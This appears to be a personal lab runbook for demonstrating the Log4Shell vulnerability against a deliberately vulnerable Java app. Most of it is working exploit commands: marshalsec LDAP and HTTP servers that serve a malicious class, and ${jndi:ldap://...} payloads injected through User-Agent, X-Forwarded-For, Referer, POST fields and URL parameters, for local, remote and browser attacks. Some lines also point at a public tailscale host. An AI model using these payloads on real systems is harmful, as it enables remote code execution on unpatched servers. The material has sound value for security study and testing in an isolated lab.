http://logwebapp.mooo.com:9080/
http://logwebapp.mooo.com:9080/?search=${jndi:ldap://logwebapp.mooo.com:1389/Exploit}


## ✅ EXPLOITATION DEMO - WORKING COMMANDS

### Terminal 1 - Start Vulnerable Application:
```powershell
cd C:\Log4Shell-Lab\vulnerable-app

# Start with ALL required JVM flags for Java 8
java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true" "-Dcom.sun.jndi.rmi.object.trustURLCodebase=true" "-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true" SimpleVulnerable 2>&1 | Tee-Object -FilePath app.log
```

### Terminal 2 - Start marshalsec LDAP Server:
```powershell
cd C:\Log4Shell-Lab\vulnerable-app

# Start LDAP server (marshalsec)
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

### Terminal 3 - Start HTTP Server:
```powershell
cd C:\Log4Shell-Lab\ldap-server\

# Serve malicious class file
python -m http.server 8888
```

### Terminal 4 - if Running from Office:
tailscale funnel 8080

## add to hosts file
127.0.0.1 attacker.local

### Terminal 5 - Run the attack from remote:
##change the to the URL that tailscale funnel showsvcgh
https://win11.tailc1d7d3.ts.net/?q=${jndi:ldap://attacker.local:1389/Exploit}


### Terminal 4 - Launch Exploits:

#### Local Attack:
```powershell
# Test basic JNDI expansion (should show Java version)
curl -H "User-Agent: `${java:version}" http://localhost:8080

# Launch Log4Shell exploit
curl -H "User-Agent: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080

# Alternative attack vectors
curl -H "X-Forwarded-For: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
curl -X POST -d "username=`${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
curl "http://localhost:8080/?search=`${jndi:ldap://127.0.0.1:1389/Exploit}"
```

#### Remote Attack (from another machine):
```powershell
# Replace YOUR_VM_IP with actual target IP

# User-Agent attack
curl -H "User-Agent: `${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/

# URL parameter attack
curl "http://YOUR_VM_IP:8080/?user=\${jndi:ldap://YOUR_VM_IP:1389/Exploit}"

# POST data attack
curl -X POST -d "login=\${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/

# Custom header attacks
curl -H "X-Forwarded-For: \${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
curl -H "X-Real-IP: \${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
curl -H "Referer: \${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
```

#### Browser Attack (simplest):
Just paste this URL in any browser:
```
http://YOUR_VM_IP:8080/?q=${jndi:ldap://YOUR_VM_IP:1389/Exploit}
```